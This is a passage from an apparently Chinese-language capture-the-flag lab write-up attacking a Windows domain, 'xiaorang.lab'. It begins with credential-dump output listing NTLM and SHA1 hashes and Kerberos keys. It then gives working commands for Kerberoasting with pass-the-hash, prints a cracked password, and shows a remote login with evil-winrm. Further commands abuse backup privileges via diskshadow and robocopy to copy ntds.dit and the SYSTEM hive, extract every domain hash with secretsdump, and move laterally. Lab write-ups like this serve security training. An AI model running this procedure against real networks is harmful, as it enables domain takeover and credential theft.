	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 6408299 (00000000:0061c86b)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 17:18:58
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:24
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:22
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64562 (00000000:0000fc32)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:22
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 33848 (00000000:00008438)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:21
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 9d 06 46 3a 3d 0f 68 6e 2a 5d c5 54 1c 2f 08 0e 89 4e d3 a2 ed f1 bb 97 e0 e5 e2 13 bf 4b f3 ba 34 92 9c 8d da a9 f9 ad d7 76 ac 65 21 1c 6d 29 a6 cd 47 3e d9 a7 b8 c9 2c 7f 68 f8 7d ae 8d 16 0c a6 79 20 f2 ff 69 fc 58 9b f1 31 15 e0 5c 4d f7 d1 52 0e 2f df fa bc 5a 36 b7 98 51 5c ea db d5 2e dc 03 0e 6c bc 82 68 f9 dc af c3 7d 42 8c 00 98 ad ea 23 4f 1e 66 38 31 e5 39 6d f5 4d c9 9e af 8e 23 92 7f 35 88 d4 68 4d 9b 32 4e 77 87 64 36 e9 ba 82 52 c8 65 2f 46 a9 65 29 69 e3 2f 4d 7a 7e 25 14 4e be 4a 59 91 96 ca 27 7c 5f 30 a8 0b e4 37 ff 91 95 da e5 5e 9e 9a 6e d2 73 78 e9 0b 34 49 17 3e 14 d8 be 74 e9 55 6d 74 85 f5 7a b5 03 bc cf d0 30 cc e8 93 7c 84 0a 31 79 95 48 7b 07 0d af ff 3e cb c0 de b7 d1 1a 4c fd b0 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 32671 (00000000:00007f9f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:21
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
	 * SHA1     : 4de8ba1e63be0ab7168fabda0f6d86ca04f5c1bc
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XR-0923$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/10/17 16:05:21
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xr-0923$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	
```

抓到机器用户的密码和哈希

```
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : e0688523d3dc7c2d585e7cc81a7ad303
```

提示要接管备份管理操作员帐户，可以看看他有没有注册服务

```bash
 python .\GetUserSPNs.py xiaorang.lab/'XR-0923$' -request -hashes :e0688523d3dc7c2d585e7cc81a7ad303 -dc-ip 172.22.14.11
```

获取哈希

![image-20231017175044094](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017175044094.png)

john爆破获取密码

![image-20231017175227077](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017175227077.png)

```bash
tianjing/DPQSXSXgh2
```

根据题目提示可能需要导出域控的NTDS

evil-winrm连一下



![image-20231017175528575](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017175528575.png)

查看权限，也开了 SeBackupPrivilege 和 SeRestorePrivilege 

![image-20231017175709033](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017175709033.png)

通过卷影拷贝来导出ntds

本地创一个raj.dsh，写入

```bash
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

然后切换到C目录，然后创一个test文件夹切换过去(不然后面会没权限)，把本地的raj.dsh上传上去

```bash
mkdir test
cd test
upload raj.dsh
```

卷影拷贝

```bash
diskshadow /s raj.dsh
```

复制到到当前目录，也就是我们创建的这个test目录

```bash
RoboCopy /b z:\windows\ntds . ntds.dit
download ntds.dit
```

接下来下载system

```bash
reg save HKLM\SYSTEM system
download system
```

再进行解密

```
 python secretsdump.py -ntds ntds.dit -system system local
```

成功导出哈希

![image-20231017181919716](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017181919716.png)

之后再横移，获取flag

![image-20231017182003077](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017182003077.png)
